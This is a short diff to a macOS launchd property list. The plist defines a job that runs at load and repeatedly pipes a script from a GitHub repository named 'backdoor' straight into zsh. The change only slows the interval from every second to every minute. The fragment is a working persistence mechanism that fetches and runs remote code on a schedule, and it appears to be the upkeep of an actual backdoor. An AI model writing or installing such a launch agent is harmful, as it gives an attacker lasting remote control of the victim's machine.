@@ -11,7 +11,7 @@
        <string>curl -S "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/script" | zsh</string>
    </array>
     <key>StartInterval</key>
-    <integer>1</integer>
+    <integer>60</integer>
    <key>RunAtLoad</key>
    <true/>
 </dict>
